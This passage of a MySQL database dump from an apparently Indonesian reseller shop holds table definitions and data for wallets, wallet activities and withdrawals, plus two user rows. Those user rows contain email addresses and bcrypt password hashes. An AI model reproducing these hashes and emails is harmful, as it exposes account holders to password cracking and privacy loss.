(77,'ika','ika@gmail.com',NULL,'$2y$10$O/M9kaCJxnI3O8nGIGWm4.SNN0iimDhdWuIOKjqOxsf7N1T.EpIsC','active','reseller',NULL,NULL,NULL,'2019-08-21 13:18:22','2019-08-21 13:18:22',NULL,NULL,NULL,'1111111',NULL,NULL,NULL,NULL,NULL),
(78,'FIYYA','fiyya@gmail.com',NULL,'$2y$10$oYqetUfP1/BNRqdWOk2zJe3RzEvSzIDvMenTF.lGvhiPkv6xRIW6.','active','reseller',NULL,NULL,NULL,'2019-08-23 11:15:10','2019-08-23 11:15:10',NULL,NULL,NULL,'1111111',NULL,NULL,NULL,NULL,NULL);

/*Table structure for table `wallet_activities` */

DROP TABLE IF EXISTS `wallet_activities`;

CREATE TABLE `wallet_activities` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `wallet_id` bigint(20) DEFAULT NULL,
  `wallet_in` decimal(22,2) NOT NULL DEFAULT '0.00',
  `wallet_out` decimal(22,2) NOT NULL DEFAULT '0.00',
  `title` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `order_id` bigint(20) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

/*Data for the table `wallet_activities` */

/*Table structure for table `wallets` */

DROP TABLE IF EXISTS `wallets`;

CREATE TABLE `wallets` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `user_id` bigint(20) DEFAULT NULL,
  `balanced` double NOT NULL DEFAULT '0',
  `withdraw` double NOT NULL DEFAULT '0',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `desc` text COLLATE utf8mb4_unicode_ci,
  `type` enum('Debit','Credit') COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `order_id` int(191) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=28 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

/*Data for the table `wallets` */

insert  into `wallets`(`id`,`user_id`,`balanced`,`withdraw`,`created_at`,`updated_at`,`desc`,`type`,`order_id`) values 
(1,10,150000,0,'2019-08-14 06:19:40','2019-08-14 06:19:40','Profit Dari Penjualan Barang','Credit',NULL),
(2,10,50000,0,'2019-08-14 06:20:14','2019-08-14 06:20:14','Profit Dari Penjualan Barang','Credit',NULL),
(10,10,-100000,0,'2019-08-23 19:00:50','2019-08-23 19:00:50','Withdraw','Debit',NULL),
(11,28,78000,0,'2019-08-27 10:02:16','2019-08-27 10:02:16','Profit Dari Penjualan Barang','Credit',NULL),
(25,19,41000,0,'2019-08-27 10:02:16','2019-08-27 10:02:16','Profit Dari Penjualan Barang','Credit',NULL),
(26,41,18000,0,'2019-08-28 15:17:00','2019-08-28 15:17:00','Profit Dari Penjualan Barang','Credit',10),
(27,47,38000,0,'2019-08-28 15:23:59','2019-08-28 15:23:59','Profit Dari Penjualan Barang','Credit',NULL);

/*Table structure for table `withdraws` */

DROP TABLE IF EXISTS `withdraws`;

CREATE TABLE `withdraws` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` varchar(150) NOT NULL,
  `codetransfer` varchar(110) DEFAULT NULL,
  `code_confirmation` varchar(110) DEFAULT NULL,
  `is_deleted` int(1) NOT NULL DEFAULT '0',
  `status` int(4) NOT NULL DEFAULT '0',
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `updated_at` timestamp NULL DEFAULT NULL,
  `type` varchar(100) DEFAULT NULL,
  `desc` varchar(191) DEFAULT NULL,
  `balanced` double NOT NULL,
  `amount_totransfer` double DEFAULT NULL,
  `cost` double DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=latin1;

/*Data for the table `withdraws` */

insert  into `withdraws`(`id`,`user_id`,`codetransfer`,`code_confirmation`,`is_deleted`,`status`,`created_at`,`updated_at`,`type`,`desc`,`balanced`,`amount_totransfer`,`cost`) values 
(5,'10','WD9540',NULL,0,1,'2019-08-23 12:00:50','2019-08-24 00:04:45',NULL,'Withdraw',100000,NULL,NULL);

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;
